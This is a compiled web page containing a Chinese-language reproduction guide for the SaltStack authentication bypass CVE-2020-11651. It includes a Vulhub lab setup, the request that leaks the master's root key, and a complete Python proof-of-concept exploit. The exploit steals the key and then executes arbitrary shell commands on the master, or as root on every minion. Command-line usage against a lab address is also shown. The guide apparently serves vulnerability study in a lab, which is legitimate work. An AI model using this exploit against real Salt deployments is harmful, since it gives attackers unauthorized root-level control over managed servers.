import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"SaltStack 是基于 Python 开发的一套C/S架构配置管理工具。国外某安全团队披露了 SaltStack 存在认证绕过漏洞（CVE-2020-11651）和目录遍历漏洞（CVE-2020-11652）。",-1),d=n("p",null,"在 CVE-2020-11651 认证绕过漏洞中，攻击者通过构造恶意请求，可以绕过 Salt Master 的验证逻辑，调用相关未授权函数功能，从而可以造成远程命令执行漏洞。",-1),k=n("p",null,"参考链接：",-1),m={href:"https://labs.f-secure.com/advisories/saltstack-authorization-bypass",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/rossengeorgiev/salt-security-backports",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/saltstack/salt/blob/a67d76b15615983d467ed81371b38b4a17e4f3b7/tests/integration/master/test_clear_funcs.py",target:"_blank",rel:"noopener noreferrer"},g=e(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个SaltStack Master服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，将会在本地监听如下端口：</p><ul><li>4505/4506 这是SaltStack Master与minions通信的端口</li><li>8000 这是Salt的API端口</li><li>2222 这是容器内部的SSH服务器监听的端口</li></ul><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>本文档复现CVE-2020-11651漏洞。</p><p>我们可以使用如下请求来执行<code>salt/master.py</code>中的<code>ClearFuncs:_prep_auth_info</code>方法：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{&#39;cmd&#39;: &#39;_prep_auth_info&#39;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>利用这个方法，可以获得目标的所有用户的key，利用这个key即可通过超级管理员权限执行一些后台功能，比如下发任务等。</p>`,10),y={href:"https://github.com/dozernz/cve-2020-11651",target:"_blank",rel:"noopener noreferrer"},h=n("code",null,"touch /tmp/success",-1),_=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>

<span class="token comment"># POC for exploiting CVE-2020-11651. CVE-2020-11652 not included, but this one is the really powerful one and it should be easy enough to figure out how to get 11652 working if you need.</span>
<span class="token comment"># Author: @dozernz</span>
<span class="token comment"># Some code adapted from https://github.com/rossengeorgiev/salt-security-backports</span>
<span class="token comment">#</span>
<span class="token comment"># Pre-requsities: pip3 install salt</span>


<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys

<span class="token keyword">import</span> salt
<span class="token keyword">import</span> salt<span class="token punctuation">.</span>version
<span class="token keyword">import</span> salt<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>client
<span class="token keyword">import</span> salt<span class="token punctuation">.</span>exceptions
<span class="token keyword">import</span> datetime


<span class="token keyword">def</span> <span class="token function">ping_master</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Attempting to ping master at &quot;</span><span class="token operator">+</span>master_ip<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        msg <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;cmd&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;ping&quot;</span><span class="token punctuation">}</span>
        response <span class="token operator">=</span> clear_channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">except</span> salt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>SaltReqTimeoutError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">get_rootkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> clear_channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;_prep_auth_info&#39;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> response<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                rootkey <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Retrieved root key: &quot;</span> <span class="token operator">+</span> rootkey<span class="token punctuation">)</span>
                <span class="token keyword">return</span> rootkey

        <span class="token keyword">return</span> <span class="token boolean">False</span>
        
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">def</span> <span class="token function">send_command_to_minions</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Sending command to all minions on master&quot;</span><span class="token punctuation">)</span>
    jid <span class="token operator">=</span> <span class="token string">&quot;{0:%Y%m%d%H%M%S%f}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    cmd <span class="token operator">=</span> <span class="token string">&quot;/bin/sh -c &#39;{0}&#39;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span>

    msg <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;cmd&#39;</span><span class="token punctuation">:</span><span class="token string">&quot;_send_pub&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;fun&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;cmd.run&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;arg&quot;</span><span class="token punctuation">:</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">&quot;tgt&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;*&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;ret&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;tgt_type&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;glob&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;root&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;jid&quot;</span><span class="token punctuation">:</span>jid<span class="token punctuation">}</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> clear_channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> response <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>



<span class="token keyword">def</span> <span class="token function">master_shell</span><span class="token punctuation">(</span>root_key<span class="token punctuation">,</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># This is achieved by using the stolen key to create a &quot;runner&quot; on the master node using the cmdmod module, then the cmd.exec_code function to run some python3 code that shells out.</span>
    <span class="token comment"># There is a cmd.shell function but I wasn&#39;t able to get it to accept the &quot;cmd&quot; kwarg parameter for some reason.</span>
    <span class="token comment"># It&#39;s also possible to use CVE-2020-11652 to get shell if the master instance is running as root by writing a crontab into a cron directory, or proably some other ways.</span>
    <span class="token comment"># This way is nicer though, and doesn&#39;t need the master to be running as root .</span>


    msg <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;key&quot;</span><span class="token punctuation">:</span>root_key<span class="token punctuation">,</span>
            <span class="token string">&quot;cmd&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;runner&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;fun&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;salt.cmd&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;kwarg&quot;</span><span class="token punctuation">:</span><span class="token punctuation">{</span>
                <span class="token string">&quot;fun&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;cmd.exec_code&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;lang&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;python3&quot;</span><span class="token punctuation">,</span>
                <span class="token string">&quot;code&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;import subprocess;subprocess.call(&#39;{}&#39;,shell=True)&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span>
                <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token string">&#39;jid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;20200504042611133934&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;sudo_user&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;_stamp&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;2020-05-04T04:26:13.609688&#39;</span><span class="token punctuation">}</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> clear_channel<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Got response for attempting master shell: &quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">&quot;. Looks promising!&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;something failed&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>



<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Not enough args&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Use like python3 cve-2020-11651.py &lt;targetip&gt; &lt;master/minions/fetchkeyonly&gt; &lt;command&gt;&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    
    
    target <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    master_minion_root <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>


    master_ip <span class="token operator">=</span> target
    master_port <span class="token operator">=</span> <span class="token string">&#39;4506&#39;</span>

    minion_config <span class="token operator">=</span> <span class="token punctuation">{</span>

    <span class="token string">&#39;transport&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;zeromq&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;pki_dir&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;/tmp&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;id&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;root&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;log_level&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;debug&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;master_ip&#39;</span><span class="token punctuation">:</span> master_ip<span class="token punctuation">,</span>
    <span class="token string">&#39;master_port&#39;</span><span class="token punctuation">:</span> master_port<span class="token punctuation">,</span>
    <span class="token string">&#39;auth_timeout&#39;</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
    <span class="token string">&#39;auth_tries&#39;</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token string">&#39;master_uri&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;tcp://{0}:{1}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>master_ip<span class="token punctuation">,</span> master_port<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    clear_channel <span class="token operator">=</span> salt<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ReqChannel<span class="token punctuation">.</span>factory<span class="token punctuation">(</span>minion_config<span class="token punctuation">,</span> crypt<span class="token operator">=</span><span class="token string">&#39;clear&#39;</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> ping_master<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Failed to ping the specified master server, exiting&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>


    <span class="token keyword">if</span> master_minion_root <span class="token operator">==</span> <span class="token string">&quot;master&quot;</span> <span class="token keyword">or</span> master_minion_root <span class="token operator">==</span> <span class="token string">&quot;minions&quot;</span><span class="token punctuation">:</span>
        command <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
        rootkey <span class="token operator">=</span> get_rootkey<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> rootkey<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Failed to fetch the root key from the instance. This MAY indicate that it is patched&quot;</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> master_minion_root <span class="token operator">==</span> <span class="token string">&quot;master&quot;</span><span class="token punctuation">:</span>
                master_shell<span class="token punctuation">(</span>rootkey<span class="token punctuation">,</span>command<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                send_command_to_minions<span class="token punctuation">(</span>command<span class="token punctuation">)</span>

    <span class="token keyword">elif</span> master_minion_root <span class="token operator">==</span> <span class="token string">&quot;fetchkeyonly&quot;</span><span class="token punctuation">:</span>
        get_rootkey<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Invalid usage&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>获取key：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python CVE-2020-11651.py 192.168.174.128 fetchkeyonly
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281947375.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行命令<code>touch /tmp/awesome_poc</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python CVE-2020-11651.py 192.168.174.128 master &quot;touch /tmp/awesome_poc&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281947385.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功执行命令<code>touch /tmp/awesome_poc</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281945708.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,9);function q(f,w){const a=o("ExternalLinkIcon");return i(),c("div",null,[u,r,d,k,n("ul",null,[n("li",null,[n("a",m,[s("https://labs.f-secure.com/advisories/saltstack-authorization-bypass"),t(a)])]),n("li",null,[n("a",v,[s("https://github.com/rossengeorgiev/salt-security-backports"),t(a)])]),n("li",null,[n("a",b,[s("https://github.com/saltstack/salt/blob/a67d76b15615983d467ed81371b38b4a17e4f3b7/tests/integration/master/test_clear_funcs.py"),t(a)])])]),g,n("p",null,[s("使用"),n("a",y,[s("这个POC"),t(a)]),s("，首先获取Key，再在master中执行"),h,s("：")]),_])}const C=p(l,[["render",q],["__file","SaltStack 水平权限绕过漏洞 CVE-2020-11651.html.vue"]]);export{C as default};
